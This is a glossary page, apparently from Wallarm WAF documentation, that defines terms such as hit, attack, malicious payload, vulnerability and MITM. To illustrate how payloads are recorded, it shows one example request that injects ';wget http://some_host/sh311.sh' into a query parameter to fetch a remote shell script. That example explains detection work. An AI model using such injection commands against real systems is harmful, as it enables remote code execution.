# Glossary

## Hit

A hit is a serialized malicious request (original malicious request and metadata added by the filtering node). For example:

![!Hit example](images/glossary/hit-example.png)

## Attack

An attack is a single hit or multiple hits that have the same attack type, parameter with the attack vector, and the address they are sent to. Hits may come from the same or different IP addresses and have different value of the attack vector within one attack type.

An example of an attack including a single hit:

![!Attack with one hit](images/glossary/attack-with-one-hit-example.png)

An example of an attack including many hits:

![!Attack with several hits](images/glossary/attack-with-several-hits-example.png)

## Malicious Payload

A part of an original request containing the following elements:

* Attack signs detected in a request. If several attack signs characterizing the same attack type are detected in a request, only the first sign will be recorded to a payload.
* Context of the attack sign. Context is a set of symbols preceding and closing detected attack signs. Since a payload length is limited, the context can be omitted if an attack sign is of full payload length.

For example:

* Request:

    ```bash
    curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
    ```
* Malicious payload:

    ```bash
    ;wget+http://s
    ```

    In this payload, `;wget+` is the [RCE](attacks-vulns-list.md#remote-code-execution-rce) attack sign and another part of the payload is the attack sign context.

Since attack signs are not used to detect [behavioral attacks](about-wallarm-waf/protecting-against-attacks.md#behavioral-attacks), requests sent as a part of behavioral attacks have empty payloads.

## Vulnerability
A vulnerability is an error made due to negligence or inadequate information when building or implementing a web application that can lead to an information security risk.

The information security risks are:

* Unauthorized data access; for example, access to read and modify user data.
* Denial of service.
* Data corruption and other.

The Internet traffic can be used to detect the vulnerabilities, which is what Wallarm does, among other functions.

## Security Incident
A security incident is an occurrence of a vulnerability exploitation. An incident is an attack targeted at a confirmed vulnerability.
An incident, just like an attack, is an entity external to your system and is a characteristic of the outside Internet, not the system itself. Despite the fact that the attacks targeted at existing vulnerabilities are a minority, they are of the utmost importance in terms of information security. Wallarm automatically detects the attacks targeted at existing vulnerabilities and displays them as a separate object.

## MITM
A man in the middle (MITM) attack consists of an attacker secretly relaying the communication between two parties who believe they are directly communicating with each other.
[See OWASP](https://owasp.org/www-community/attacks/Manipulator-in-the-middle_attack).

## Circular Buffer
A circular buffer is a data structure that uses a single, fixed‑size buffer as if it were connected end‑to‑end.
[See Wikipedia](https://en.wikipedia.org/wiki/Circular_buffer).

## LOM
LOM stands for Local Objective Model. LOM is a set of rules for a particular web application. The set of rules is generated based on user requests to the web application and the application's responses.

## Invalid Request
A request that was checked by filter node and does not match LOM rules.

## Reverse Proxy
A reverse proxy is a type of proxy server that retrieves resources on behalf of a client from a server and returns the resources to the client as if they originated from the Web server itself.
[See Wikipedia](https://en.wikipedia.org/wiki/Reverse_proxy).

## Certificate Authority
A certificate authority is an entity that issues digital certificates.
[See Wikipedia](https://en.wikipedia.org/wiki/Certificate_authority).
